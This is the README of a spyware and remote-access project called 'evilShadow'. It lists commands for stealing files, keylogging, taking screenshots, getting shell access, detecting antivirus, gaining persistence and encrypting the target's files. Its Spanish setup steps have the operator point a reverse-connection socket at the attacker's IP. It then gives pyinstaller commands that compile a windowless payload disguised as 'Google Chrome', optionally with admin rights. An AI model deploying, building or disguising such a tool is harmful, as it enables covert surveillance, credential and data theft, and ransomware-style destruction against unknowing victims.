# evilShadow

SpyWare. The project is currently developing…...


# Functions
(N/A) -> Not Implemented yet
```
                Aviable Commands:

                    | [!>] download <path>   -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] downloadDir <dir> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask         -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check             -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo           -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell             -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av                -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>     -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>         -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence       -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence    -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>    -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>    -> Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] crypt <file>      -> Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] keylog_dump       -> Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] screenshot        -> Take a screenshot
                    ---------------------------------------------------------
                    | [!>] cryptAll          -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction       -> (N/A) Eliminate all and close conect
                    --------------------------------------------------------- 
                    | [!>] q                 -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit              -> Terminate the conection
                    ---------------------------------------------------------
```

# Detections:
![image](https://github.com/an0mal1a/evilShadow/assets/129337574/684c71c5-eef2-41f4-bc99-82dd05dbe260)
hash: 8f361df2687c1d5ac2c9a251ab8903cea2de914305420842b566726926903b5b


# Requirements

- ```pip install -r requirements.txt```


# Preparación:

En el script **Connection.py** en la línea *239* tenemos la línea que crea la conexión. La modificamos a la direccion ip
del atacante

-     sock.connect ( ( '127.0.0.1' ,1337) )

Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio más.


# **Compilación**

- Tenemos varias opciones: (Accedemos a la carpeta CLIENT)

    ### Windows:
  
    - Admin Required:
      
        `client>pyinstaller --onefile --noconsole --clean --uac-admin -n "Google Chrome" conection.py`

    - **NO** Admin Required:
      
        `client>pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`

    ### Linux:
      
    `client>pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`

